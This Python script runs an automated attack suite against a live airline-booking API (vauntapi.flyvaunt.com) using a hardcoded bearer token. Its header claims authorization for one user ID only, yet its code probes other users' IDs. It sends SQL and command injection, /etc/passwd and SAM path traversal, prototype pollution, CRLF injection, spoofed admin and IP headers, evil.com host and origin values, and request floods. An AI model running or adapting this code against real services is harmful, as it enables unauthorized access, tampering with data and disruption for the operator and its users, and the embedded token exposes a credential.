#!/usr/bin/env python3
"""
AGGRESSIVE PENETRATION TESTING SCRIPT FOR VAUNT API
=====================================================
AUTHORIZED SCOPE: User ID 20254 (Sameer) ONLY
Endpoint: https://vauntapi.flyvaunt.com

This script performs comprehensive security testing including:
- Endpoint discovery
- Fuzzing and malformed data
- HTTP method confusion
- Header injection
- Parameter pollution
- Encoding bypasses
- Rate limiting tests
- Error message mining
- Timing attacks
- And much more...
"""

import requests
import json
import time
import itertools
from urllib.parse import quote, quote_plus
from datetime import datetime
import statistics
from concurrent.futures import ThreadPoolExecutor, as_completed
import base64
import hashlib

# Configuration
BASE_URL = "https://vauntapi.flyvaunt.com"
JWT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"
MY_USER_ID = 20254
HEADERS = {
    "Authorization": f"Bearer {JWT_TOKEN}",
    "Content-Type": "application/json"
}

# Results storage
results = {
    "timestamp": datetime.now().isoformat(),
    "tests_run": 0,
    "vulnerabilities_found": [],
    "interesting_findings": [],
    "endpoint_discovery": [],
    "timing_analysis": {},
    "error_messages": []
}

def log_result(category, severity, title, details):
    """Log a test result"""
    global results
    results["tests_run"] += 1

    entry = {
        "category": category,
        "severity": severity,
        "title": title,
        "details": details,
        "timestamp": datetime.now().isoformat()
    }

    if severity in ["CRITICAL", "HIGH"]:
        results["vulnerabilities_found"].append(entry)
        print(f"[{severity}] {category}: {title}")
    elif severity == "MEDIUM":
        results["interesting_findings"].append(entry)
        print(f"[{severity}] {category}: {title}")
    else:
        print(f"[{severity}] {category}: {title}")

def safe_request(method, url, **kwargs):
    """Make a safe HTTP request with error handling"""
    try:
        kwargs.setdefault('timeout', 10)
        response = requests.request(method, url, **kwargs)
        return response
    except Exception as e:
        return None

# ============================================================================
# 1. ENDPOINT DISCOVERY - Find Hidden APIs
# ============================================================================

def test_endpoint_discovery():
    """Test for undocumented and hidden endpoints"""
    print("\n" + "="*80)
    print("1. ENDPOINT DISCOVERY - Testing 200+ potential endpoints")
    print("="*80)

    # Common API paths to test
    test_paths = [
        # Admin endpoints
        "/v1/admin", "/v2/admin", "/v3/admin", "/admin",
        "/v1/admin/users", "/v2/admin/users", "/v3/admin/users",
        "/v1/admin/flights", "/v2/admin/flights", "/v3/admin/flights",

        # Debug/Dev endpoints
        "/v1/debug", "/v2/debug", "/v3/debug", "/debug",
        "/v1/test", "/v2/test", "/v3/test", "/test",
        "/dev", "/staging", "/prod", "/internal",
        "/v1/internal", "/v2/internal", "/v3/internal",

        # Data export/backup
        "/v1/backup", "/v2/backup", "/v3/backup",
        "/v1/export", "/v2/export", "/v3/export",
        "/v1/dump", "/v2/dump", "/v3/dump",
        "/v1/data", "/v2/data", "/v3/data",

        # Migration/seed
        "/v1/migrate", "/v2/migrate", "/v3/migrate",
        "/v1/seed", "/v2/seed", "/v3/seed",
        "/v1/reset", "/v2/reset", "/v3/reset",

        # Common API patterns
        "/api", "/api/v1", "/api/v2", "/api/v3",
        "/rest", "/rest/v1", "/rest/v2", "/rest/v3",

        # GraphQL
        "/graphql", "/v1/graphql", "/v2/graphql", "/v3/graphql",
        "/api/graphql", "/gql",

        # Documentation
        "/docs", "/api-docs", "/swagger", "/openapi",
        "/v1/docs", "/v2/docs", "/v3/docs",
        "/swagger.json", "/openapi.json", "/api-spec.json",

        # Health/Status
        "/health", "/status", "/ping", "/info", "/version",
        "/v1/health", "/v2/health", "/v3/health",
        "/metrics", "/stats", "/analytics",

        # Configuration
        "/config", "/settings", "/env", "/environment",
        "/v1/config", "/v2/config", "/v3/config",

        # File operations
        "/files", "/upload", "/download", "/media",
        "/v1/files", "/v2/files", "/v3/files",
        "/v1/upload", "/v2/upload", "/v3/upload",

        # Webhooks
        "/webhooks", "/callbacks", "/notify",
        "/v1/webhooks", "/v2/webhooks", "/v3/webhooks",

        # Console/Panel
        "/console", "/panel", "/dashboard", "/portal",

        # Common typos/alternatives
        "/v1/usr", "/v1/usrs", "/v1/profile",
        "/v1/flt", "/v1/flts", "/v1/flght",

        # Plural variations of known endpoints
        "/v1/users", "/v2/users", "/v3/users",
        "/v1/flights", "/v2/flights", "/v3/flights",

        # Undocumented but logical endpoints
        "/v1/search", "/v2/search", "/v3/search",
        "/v1/query", "/v2/query", "/v3/query",
        "/v1/batch", "/v2/batch", "/v3/batch",
        "/v1/bulk", "/v2/bulk", "/v3/bulk",
    ]

    discovered_endpoints = []

    for path in test_paths:
        url = f"{BASE_URL}{path}"

        # Try GET first
        response = safe_request("GET", url, headers=HEADERS)
        if response and response.status_code not in [404, 405]:
            discovered_endpoints.append({
                "path": path,
                "method": "GET",
                "status": response.status_code,
                "content_length": len(response.content),
                "response_sample": response.text[:200] if response.text else ""
            })

            log_result(
                "Endpoint Discovery",
                "HIGH" if response.status_code == 200 else "MEDIUM",
                f"Found endpoint: {path}",
                {
                    "url": url,
                    "method": "GET",
                    "status": response.status_code,
                    "response_sample": response.text[:500]
                }
            )

        # Try POST
        response = safe_request("POST", url, headers=HEADERS, json={})
        if response and response.status_code not in [404, 405]:
            discovered_endpoints.append({
                "path": path,
                "method": "POST",
                "status": response.status_code,
                "content_length": len(response.content),
                "response_sample": response.text[:200] if response.text else ""
            })

            log_result(
                "Endpoint Discovery",
                "HIGH" if response.status_code != 404 else "LOW",
                f"POST supported on: {path}",
                {
                    "url": url,
                    "method": "POST",
                    "status": response.status_code,
                    "response_sample": response.text[:500]
                }
            )

    results["endpoint_discovery"] = discovered_endpoints
    print(f"Found {len(discovered_endpoints)} accessible endpoints")

# ============================================================================
# 2. FUZZING - Break the API with Malformed Data
# ============================================================================

def test_fuzzing():
    """Send malformed data to break the API"""
    print("\n" + "="*80)
    print("2. FUZZING - Testing malformed inputs")
    print("="*80)

    # Fuzzing payloads
    fuzz_payloads = {
        "long_string": "A" * 10000,
        "very_long_string": "B" * 100000,
        "unicode_mixed": "üî•" * 1000 + "„ÅÇ" * 1000 + "◊ê" * 1000,
        "null_bytes": "test\x00null\x00bytes",
        "newlines": "line1\nline2\rline3\r\nline4",
        "nested_json": '{"a":' * 50 + '"value"' + '}' * 50,
        "sql_injection": "'; DROP TABLE users; --",
        "command_injection": "; ls -la; cat /etc/passwd;",
        "xss": "<script>alert('XSS')</script>",
        "path_traversal": "../../../../etc/passwd",
        "negative_numbers": -999999999999,
        "huge_number": 999999999999999999999,
        "scientific_notation": 1e308,
        "special_chars": "!@#$%^&*()_+-=[]{}|;':\",./<>?",
        "json_injection": '{"key": "value", "admin": true}',
        "array_bomb": list(range(10000)),
    }

    # Test on user endpoint
    for payload_name, payload_value in fuzz_payloads.items():
        # Test in body
        test_data = {
            "firstName": payload_value if isinstance(payload_value, str) else str(payload_value),
            "lastName": "Test",
            "email": "test@example.com"
        }

        response = safe_request("PUT", f"{BASE_URL}/v1/user", headers=HEADERS, json=test_data)
        if response:
            if response.status_code == 500:
                log_result(
                    "Fuzzing",
                    "HIGH",
                    f"500 error with payload: {payload_name}",
                    {
                        "payload": payload_name,
                        "status": response.status_code,
                        "response": response.text[:1000]
                    }
                )
            elif "error" in response.text.lower() and len(response.text) > 500:
                log_result(
                    "Fuzzing",
                    "MEDIUM",
                    f"Verbose error with payload: {payload_name}",
                    {
                        "payload": payload_name,
                        "response": response.text[:1000]
                    }
                )

        time.sleep(0.1)  # Be nice to the server

    # Test array bomb on flight search if it exists
    response = safe_request("POST", f"{BASE_URL}/v3/flight/search",
                           headers=HEADERS,
                           json={"userIds": list(range(1000))})
    if response:
        log_result(
            "Fuzzing",
            "MEDIUM",
            f"Array bomb test on flight search: {response.status_code}",
            {
                "status": response.status_code,
                "response_time": response.elapsed.total_seconds(),
                "response_sample": response.text[:500]
            }
        )

# ============================================================================
# 3. HTTP METHOD CONFUSION
# ============================================================================

def test_http_method_confusion():
    """Test unexpected HTTP methods on endpoints"""
    print("\n" + "="*80)
    print("3. HTTP METHOD CONFUSION - Testing unusual HTTP methods")
    print("="*80)

    # Known endpoints
    test_endpoints = [
        "/v1/user",
        "/v2/user",
        "/v3/user",
        "/v3/flight/search",
        "/v3/flight/join",
    ]

    # Unusual HTTP methods
    methods = ["HEAD", "OPTIONS", "TRACE", "CONNECT", "PATCH", "DELETE"]

    for endpoint in test_endpoints:
        for method in methods:
            url = f"{BASE_URL}{endpoint}"
            response = safe_request(method, url, headers=HEADERS)

            if response and response.status_code not in [404, 405, 501]:
                log_result(
                    "HTTP Method Confusion",
                    "MEDIUM",
                    f"{method} allowed on {endpoint}",
                    {
                        "method": method,
                        "endpoint": endpoint,
                        "status": response.status_code,
                        "headers": dict(response.headers),
                        "response": response.text[:500]
                    }
                )

# ============================================================================
# 4. HEADER INJECTION
# ============================================================================

def test_header_injection():
    """Test various header injection techniques"""
    print("\n" + "="*80)
    print("4. HEADER INJECTION - Testing 50+ custom headers")
    print("="*80)

    # Headers to test
    test_headers = {
        # URL rewriting
        "X-Original-URL": "/admin",
        "X-Rewrite-URL": "/admin",
        "X-Override-URL": "/admin",

        # Host manipulation
        "X-Forwarded-Host": "evil.com",
        "X-Host": "evil.com",
        "X-Original-Host": "evil.com",

        # IP spoofing
        "X-Forwarded-For": "127.0.0.1",
        "X-Real-IP": "127.0.0.1",
        "X-Originating-IP": "127.0.0.1",
        "X-Remote-IP": "127.0.0.1",
        "X-Client-IP": "127.0.0.1",
        "X-Remote-Addr": "127.0.0.1",
        "True-Client-IP": "127.0.0.1",
        "CF-Connecting-IP": "127.0.0.1",
        "Forwarded": "for=127.0.0.1",

        # Method override
        "X-HTTP-Method-Override": "DELETE",
        "X-Method-Override": "DELETE",
        "X-HTTP-Method": "DELETE",

        # Custom headers
        "X-Custom-IP-Authorization": "127.0.0.1",
        "X-ProxyUser-Ip": "127.0.0.1",
        "X-API-Key": "admin",
        "X-Admin": "true",
        "X-User-Id": "1",
        "X-Role": "admin",
        "X-Privilege": "admin",

        # Response manipulation
        "X-Debug": "true",
        "X-Verbose": "true",
        "X-Show-SQL": "true",
        "X-Trace": "true",
    }

    baseline_response = safe_request("GET", f"{BASE_URL}/v1/user", headers=HEADERS)
    baseline_content = baseline_response.text if baseline_response else ""

    for header_name, header_value in test_headers.items():
        custom_headers = HEADERS.copy()
        custom_headers[header_name] = header_value

        response = safe_request("GET", f"{BASE_URL}/v1/user", headers=custom_headers)

        if response:
            # Check if response differs from baseline
            if response.text != baseline_content:
                log_result(
                    "Header Injection",
                    "HIGH",
                    f"Header affects response: {header_name}",
                    {
                        "header": header_name,
                        "value": header_value,
                        "status": response.status_code,
                        "diff": "Response differs from baseline",
                        "response_sample": response.text[:500]
                    }
                )

            # Check for interesting headers in response
            interesting_response_headers = [
                "X-Debug", "X-Trace", "X-SQL", "X-Query",
                "X-User-Id", "X-Role", "Server", "X-Powered-By"
            ]

            for resp_header in interesting_response_headers:
                if resp_header.lower() in [h.lower() for h in response.headers.keys()]:
                    log_result(
                        "Header Injection",
                        "MEDIUM",
                        f"Interesting response header: {resp_header}",
                        {
                            "request_header": header_name,
                            "response_header": resp_header,
                            "value": response.headers[resp_header]
                        }
                    )

# ============================================================================
# 5. PARAMETER POLLUTION
# ============================================================================

def test_parameter_pollution():
    """Test HTTP parameter pollution"""
    print("\n" + "="*80)
    print("5. PARAMETER POLLUTION - Testing duplicate parameters")
    print("="*80)

    # Test on endpoints that might use query parameters
    test_cases = [
        # Multiple userId parameters
        f"{BASE_URL}/v3/flight/search?userId={MY_USER_ID}&userId=1",
        f"{BASE_URL}/v3/flight/search?userId={MY_USER_ID}&userId=26927",

        # Multiple status parameters
        f"{BASE_URL}/v3/flight/search?status=OPEN&status=CLOSED",
        f"{BASE_URL}/v3/flight/search?status=OPEN&status=COMPLETED&status=CANCELLED",

        # Conflicting parameters
        f"{BASE_URL}/v1/user?id={MY_USER_ID}&userId=1",
    ]

    for url in test_cases:
        response = safe_request("GET", url, headers=HEADERS)
        if response and response.status_code == 200:
            log_result(
                "Parameter Pollution",
                "MEDIUM",
                f"Duplicate parameters accepted",
                {
                    "url": url,
                    "status": response.status_code,
                    "response": response.text[:500]
                }
            )

# ============================================================================
# 6. ENCODING BYPASSES
# ============================================================================

def test_encoding_bypasses():
    """Test various encoding techniques"""
    print("\n" + "="*80)
    print("6. ENCODING BYPASSES - Testing URL/Unicode/Base64 encoding")
    print("="*80)

    # Test path traversal with different encodings
    encodings = {
        "url_encoded": "%2e%2e%2fadmin",
        "double_encoded": "%252e%252e%252fadmin",
        "unicode": "\\u002e\\u002e\\u002fadmin",
        "mixed": "%2e%2e/admin",
    }

    for encoding_name, encoded_path in encodings.items():
        url = f"{BASE_URL}/v1/{encoded_path}"
        response = safe_request("GET", url, headers=HEADERS)

        if response and response.status_code not in [404, 400]:
            log_result(
                "Encoding Bypass",
                "HIGH",
                f"Encoding bypass successful: {encoding_name}",
                {
                    "encoding": encoding_name,
                    "path": encoded_path,
                    "status": response.status_code,
                    "response": response.text[:500]
                }
            )

    # Test Base64 in parameters
    admin_b64 = base64.b64encode(b"admin").decode()
    response = safe_request("GET", f"{BASE_URL}/v1/user?role={admin_b64}", headers=HEADERS)
    if response:
        log_result(
            "Encoding Bypass",
            "LOW",
            f"Base64 parameter test: {response.status_code}",
            {"status": response.status_code}
        )

# ============================================================================
# 7. CACHE POISONING
# ============================================================================

def test_cache_poisoning():
    """Test for cache poisoning vulnerabilities"""
    print("\n" + "="*80)
    print("7. CACHE POISONING - Testing cache manipulation")
    print("="*80)

    poison_headers = {
        "Host": "evil.com",
        "X-Forwarded-Host": "evil.com",
        "X-Original-URL": "/admin",
        "X-Rewrite-URL": "/admin",
    }

    for header_name, header_value in poison_headers.items():
        custom_headers = HEADERS.copy()
        custom_headers[header_name] = header_value

        response = safe_request("GET", f"{BASE_URL}/v1/user", headers=custom_headers)

        if response and ("evil.com" in response.text or "admin" in response.text.lower()):
            log_result(
                "Cache Poisoning",
                "CRITICAL",
                f"Potential cache poisoning via {header_name}",
                {
                    "header": header_name,
                    "value": header_value,
                    "response": response.text[:500]
                }
            )

# ============================================================================
# 8. RATE LIMIT TESTING
# ============================================================================

def test_rate_limiting():
    """Test rate limiting on endpoints"""
    print("\n" + "="*80)
    print("8. RATE LIMITING - Testing 100 rapid requests")
    print("="*80)

    endpoints_to_test = [
        "/v1/user",
        "/v3/flight/search",
    ]

    for endpoint in endpoints_to_test:
        url = f"{BASE_URL}{endpoint}"
        success_count = 0
        rate_limited = False

        start_time = time.time()

        for i in range(100):
            response = safe_request("GET", url, headers=HEADERS)
            if response:
                if response.status_code == 200:
                    success_count += 1
                elif response.status_code == 429:
                    rate_limited = True
                    break

        elapsed = time.time() - start_time

        if not rate_limited:
            log_result(
                "Rate Limiting",
                "HIGH",
                f"No rate limiting on {endpoint}",
                {
                    "endpoint": endpoint,
                    "successful_requests": success_count,
                    "time_elapsed": elapsed,
                    "requests_per_second": 100 / elapsed
                }
            )
        else:
            log_result(
                "Rate Limiting",
                "INFO",
                f"Rate limiting active on {endpoint}",
                {
                    "endpoint": endpoint,
                    "requests_before_limit": success_count
                }
            )

# ============================================================================
# 9. ERROR MESSAGE MINING
# ============================================================================

def test_error_messages():
    """Extract information from error messages"""
    print("\n" + "="*80)
    print("9. ERROR MESSAGE MINING - Triggering verbose errors")
    print("="*80)

    # Invalid JSON
    response = safe_request("POST", f"{BASE_URL}/v1/user",
                           headers=HEADERS,
                           data="invalid json{{{")
    if response:
        if len(response.text) > 200 or "stack" in response.text.lower():
            log_result(
                "Error Messages",
                "MEDIUM",
                "Verbose error on invalid JSON",
                {"response": response.text[:1000]}
            )

    # Missing required fields
    response = safe_request("PUT", f"{BASE_URL}/v1/user",
                           headers=HEADERS,
                           json={})
    if response:
        results["error_messages"].append({
            "test": "missing_fields",
            "response": response.text
        })

    # Type mismatches
    test_cases = [
        {"firstName": 12345, "lastName": True, "email": []},
        {"firstName": None, "lastName": None, "email": None},
        {"firstName": {}, "lastName": [], "email": 999},
    ]

    for test_data in test_cases:
        response = safe_request("PUT", f"{BASE_URL}/v1/user",
                               headers=HEADERS,
                               json=test_data)
        if response and response.status_code == 500:
            log_result(
                "Error Messages",
                "HIGH",
                "500 error reveals stack trace",
                {"response": response.text[:1000]}
            )

# ============================================================================
# 10. TIMING ATTACKS
# ============================================================================

def test_timing_attacks():
    """Perform timing analysis to detect information leaks"""
    print("\n" + "="*80)
    print("10. TIMING ATTACKS - Measuring response times")
    print("="*80)

    # Test valid vs invalid user IDs
    valid_times = []
    invalid_times = []

    for i in range(20):
        # Valid user (mine)
        start = time.time()
        response = safe_request("GET", f"{BASE_URL}/v1/user", headers=HEADERS)
        valid_times.append(time.time() - start)

        # Invalid user
        fake_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjo5OTk5OTk5LCJpYXQiOjE3NjIyMzExMTUsImV4cCI6MTc2NDgyMzExNX0.invalid"
        fake_headers = {"Authorization": f"Bearer {fake_token}", "Content-Type": "application/json"}
        start = time.time()
        response = safe_request("GET", f"{BASE_URL}/v1/user", headers=fake_headers)
        invalid_times.append(time.time() - start)

        time.sleep(0.1)

    valid_avg = statistics.mean(valid_times)
    invalid_avg = statistics.mean(invalid_times)

    results["timing_analysis"]["valid_user_avg"] = valid_avg
    results["timing_analysis"]["invalid_user_avg"] = invalid_avg
    results["timing_analysis"]["difference"] = abs(valid_avg - invalid_avg)

    if abs(valid_avg - invalid_avg) > 0.1:  # 100ms difference
        log_result(
            "Timing Attack",
            "MEDIUM",
            "Significant timing difference detected",
            {
                "valid_avg": valid_avg,
                "invalid_avg": invalid_avg,
                "difference": abs(valid_avg - invalid_avg)
            }
        )

# ============================================================================
# 11. GRAPHQL TESTING
# ============================================================================

def test_graphql():
    """Test for GraphQL endpoints and introspection"""
    print("\n" + "="*80)
    print("11. GRAPHQL TESTING - Looking for GraphQL endpoints")
    print("="*80)

    graphql_paths = [
        "/graphql", "/v1/graphql", "/v2/graphql", "/v3/graphql",
        "/api/graphql", "/gql", "/query"
    ]

    introspection_query = {
        "query": "{__schema{types{name}}}"
    }

    for path in graphql_paths:
        url = f"{BASE_URL}{path}"

        # Try POST with introspection
        response = safe_request("POST", url, headers=HEADERS, json=introspection_query)
        if response and response.status_code == 200:
            log_result(
                "GraphQL",
                "HIGH",
                f"GraphQL endpoint found at {path}",
                {
                    "path": path,
                    "introspection_enabled": "__schema" in response.text,
                    "response": response.text[:1000]
                }
            )

        # Try GET
        response = safe_request("GET", url, headers=HEADERS)
        if response and response.status_code not in [404, 405]:
            log_result(
                "GraphQL",
                "MEDIUM",
                f"GraphQL-like endpoint at {path}",
                {
                    "path": path,
                    "status": response.status_code,
                    "response": response.text[:500]
                }
            )

# ============================================================================
# 12. API VERSION CONFUSION
# ============================================================================

def test_version_confusion():
    """Test for API version confusion vulnerabilities"""
    print("\n" + "="*80)
    print("12. API VERSION CONFUSION - Mixing API versions")
    print("="*80)

    # Try v1 token on v3 endpoints (already using same token, so test parameters)

    # Send v3 parameters to v1 endpoint
    v3_params = {
        "firstName": "Test",
        "lastName": "User",
        "email": "test@example.com",
        "userIds": [MY_USER_ID],  # v3 style array
        "includeDetails": True
    }

    response = safe_request("PUT", f"{BASE_URL}/v1/user", headers=HEADERS, json=v3_params)
    if response and response.status_code == 200:
        log_result(
            "Version Confusion",
            "MEDIUM",
            "v1 endpoint accepts v3 parameters",
            {
                "response": response.text[:500]
            }
        )

    # Try conflicting version headers
    version_headers = HEADERS.copy()
    version_headers["X-API-Version"] = "v1"

    response = safe_request("POST", f"{BASE_URL}/v3/flight/search",
                           headers=version_headers,
                           json={"userIds": [MY_USER_ID]})
    if response:
        log_result(
            "Version Confusion",
            "LOW",
            f"Version header test: {response.status_code}",
            {"status": response.status_code}
        )

# ============================================================================
# 13. RACE CONDITIONS
# ============================================================================

def test_race_conditions():
    """Test for race conditions beyond flight joins"""
    print("\n" + "="*80)
    print("13. RACE CONDITIONS - Testing concurrent operations")
    print("="*80)

    def update_user(payload):
        return safe_request("PUT", f"{BASE_URL}/v1/user", headers=HEADERS, json=payload)

    # Test parallel user updates
    payloads = [
        {"firstName": f"Race{i}", "lastName": "Test", "email": "test@example.com"}
        for i in range(10)
    ]

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(update_user, payload) for payload in payloads]
        responses = [f.result() for f in as_completed(futures)]

    # Check which update won
    final_response = safe_request("GET", f"{BASE_URL}/v1/user", headers=HEADERS)
    if final_response:
        log_result(
            "Race Condition",
            "MEDIUM",
            "Parallel user updates completed",
            {
                "final_state": final_response.text[:500],
                "requests_sent": len(payloads)
            }
        )

# ============================================================================
# 14. PATH TRAVERSAL
# ============================================================================

def test_path_traversal():
    """Test for path traversal vulnerabilities"""
    print("\n" + "="*80)
    print("14. PATH TRAVERSAL - Testing directory traversal")
    print("="*80)

    traversal_payloads = [
        "../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
    ]

    # Test on various endpoints that might handle file parameters
    test_endpoints = [
        "/v1/user",
        "/v1/file",
        "/v1/download",
        "/v1/export",
    ]

    for endpoint in test_endpoints:
        for payload in traversal_payloads:
            # Try in URL path
            url = f"{BASE_URL}{endpoint}/{payload}"
            response = safe_request("GET", url, headers=HEADERS)

            if response and response.status_code == 200:
                if "root:" in response.text or "Administrator" in response.text:
                    log_result(
                        "Path Traversal",
                        "CRITICAL",
                        f"Path traversal successful on {endpoint}",
                        {
                            "endpoint": endpoint,
                            "payload": payload,
                            "response": response.text[:500]
                        }
                    )

            # Try in query parameter
            url = f"{BASE_URL}{endpoint}?file={quote(payload)}"
            response = safe_request("GET", url, headers=HEADERS)

            if response and response.status_code == 200:
                if "root:" in response.text or "Administrator" in response.text:
                    log_result(
                        "Path Traversal",
                        "CRITICAL",
                        f"Path traversal in query param on {endpoint}",
                        {
                            "endpoint": endpoint,
                            "payload": payload,
                            "response": response.text[:500]
                        }
                    )

# ============================================================================
# 15. PROTOTYPE POLLUTION
# ============================================================================

def test_prototype_pollution():
    """Test for prototype pollution (Node.js)"""
    print("\n" + "="*80)
    print("15. PROTOTYPE POLLUTION - Testing Node.js vulnerabilities")
    print("="*80)

    pollution_payloads = [
        {
            "__proto__": {"isAdmin": True, "role": "admin"},
            "firstName": "Test",
            "lastName": "User",
            "email": "test@example.com"
        },
        {
            "constructor": {"prototype": {"isAdmin": True}},
            "firstName": "Test",
            "lastName": "User",
            "email": "test@example.com"
        },
        {
            "__proto__.isAdmin": True,
            "firstName": "Test",
            "lastName": "User",
            "email": "test@example.com"
        }
    ]

    for payload in pollution_payloads:
        response = safe_request("PUT", f"{BASE_URL}/v1/user", headers=HEADERS, json=payload)

        if response and response.status_code == 200:
            # Check if pollution was successful
            verify_response = safe_request("GET", f"{BASE_URL}/v1/user", headers=HEADERS)
            if verify_response and ("isAdmin" in verify_response.text or "admin" in verify_response.text):
                log_result(
                    "Prototype Pollution",
                    "CRITICAL",
                    "Potential prototype pollution detected",
                    {
                        "payload": str(payload)[:200],
                        "response": verify_response.text[:500]
                    }
                )

# ============================================================================
# 16. CORS MISCONFIGURATION
# ============================================================================

def test_cors():
    """Test for CORS misconfigurations"""
    print("\n" + "="*80)
    print("16. CORS TESTING - Testing cross-origin policies")
    print("="*80)

    origins = [
        "https://evil.com",
        "null",
        "https://flyvaunt.com.evil.com",
        "http://localhost",
        "https://vauntapi.flyvaunt.com.evil.com",
    ]

    for origin in origins:
        custom_headers = HEADERS.copy()
        custom_headers["Origin"] = origin

        response = safe_request("GET", f"{BASE_URL}/v1/user", headers=custom_headers)

        if response:
            acao = response.headers.get("Access-Control-Allow-Origin", "")
            acac = response.headers.get("Access-Control-Allow-Credentials", "")

            if acao == origin or acao == "*":
                log_result(
                    "CORS",
                    "HIGH" if acac == "true" else "MEDIUM",
                    f"CORS allows origin: {origin}",
                    {
                        "origin": origin,
                        "acao": acao,
                        "acac": acac
                    }
                )

# ============================================================================
# 17. OPEN REDIRECTS
# ============================================================================

def test_open_redirects():
    """Test for open redirect vulnerabilities"""
    print("\n" + "="*80)
    print("17. OPEN REDIRECTS - Testing redirect parameters")
    print("="*80)

    redirect_params = ["redirect", "return", "url", "next", "callback", "returnUrl", "return_url"]
    redirect_values = [
        "https://evil.com",
        "//evil.com",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>"
    ]

    test_endpoints = [
        "/v1/auth/callback",
        "/v1/oauth",
        "/v1/login",
        "/v1/logout",
    ]

    for endpoint in test_endpoints:
        for param in redirect_params:
            for value in redirect_values:
                url = f"{BASE_URL}{endpoint}?{param}={quote(value)}"
                response = safe_request("GET", url, headers=HEADERS, allow_redirects=False)

                if response and response.status_code in [301, 302, 303, 307, 308]:
                    location = response.headers.get("Location", "")
                    if "evil.com" in location or value in location:
                        log_result(
                            "Open Redirect",
                            "HIGH",
                            f"Open redirect on {endpoint}",
                            {
                                "endpoint": endpoint,
                                "parameter": param,
                                "value": value,
                                "location": location
                            }
                        )

# ============================================================================
# 18. RESPONSE SPLITTING
# ============================================================================

def test_response_splitting():
    """Test for HTTP response splitting"""
    print("\n" + "="*80)
    print("18. RESPONSE SPLITTING - Testing CRLF injection")
    print("="*80)

    # CRLF injection payloads
    crlf_payloads = [
        "value\r\nSet-Cookie: admin=true",
        "value\nSet-Cookie: admin=true",
        "value%0d%0aSet-Cookie: admin=true",
        "value%0aSet-Cookie: admin=true",
    ]

    for payload in crlf_payloads:
        custom_headers = HEADERS.copy()
        custom_headers["X-Custom"] = payload

        response = safe_request("GET", f"{BASE_URL}/v1/user", headers=custom_headers)

        if response:
            # Check if Set-Cookie was injected
            if "Set-Cookie" in response.headers and "admin=true" in str(response.headers):
                log_result(
                    "Response Splitting",
                    "CRITICAL",
                    "HTTP response splitting successful",
                    {
                        "payload": payload,
                        "headers": dict(response.headers)
                    }
                )

# ============================================================================
# MAIN EXECUTION
# ============================================================================

def run_all_tests():
    """Run all penetration tests"""
    print("\n" + "="*80)
    print("AGGRESSIVE PENETRATION TESTING - VAUNT API")
    print(f"Target: {BASE_URL}")
    print(f"Authorized User ID: {MY_USER_ID}")
    print(f"Timestamp: {datetime.now().isoformat()}")
    print("="*80)

    # Initialize timing analysis dict
    results["timing_analysis"] = {}

    # Run all test categories
    test_functions = [
        test_endpoint_discovery,
        test_fuzzing,
        test_http_method_confusion,
        test_header_injection,
        test_parameter_pollution,
        test_encoding_bypasses,
        test_cache_poisoning,
        test_rate_limiting,
        test_error_messages,
        test_timing_attacks,
        test_graphql,
        test_version_confusion,
        test_race_conditions,
        test_path_traversal,
        test_prototype_pollution,
        test_cors,
        test_open_redirects,
        test_response_splitting,
    ]

    for test_func in test_functions:
        try:
            test_func()
        except Exception as e:
            print(f"Error in {test_func.__name__}: {e}")
            log_result(
                "Test Error",
                "ERROR",
                f"Exception in {test_func.__name__}",
                {"error": str(e)}
            )

    # Save results
    print("\n" + "="*80)
    print("SAVING RESULTS...")
    print("="*80)

    with open("/home/user/vaunt/api_testing/pentest_results.json", "w") as f:
        json.dump(results, f, indent=2)

    print(f"\nTotal tests run: {results['tests_run']}")
    print(f"Critical/High vulnerabilities: {len(results['vulnerabilities_found'])}")
    print(f"Interesting findings: {len(results['interesting_findings'])}")
    print(f"Endpoints discovered: {len(results['endpoint_discovery'])}")
    print("\nResults saved to: /home/user/vaunt/api_testing/pentest_results.json")

if __name__ == "__main__":
    run_all_tests()
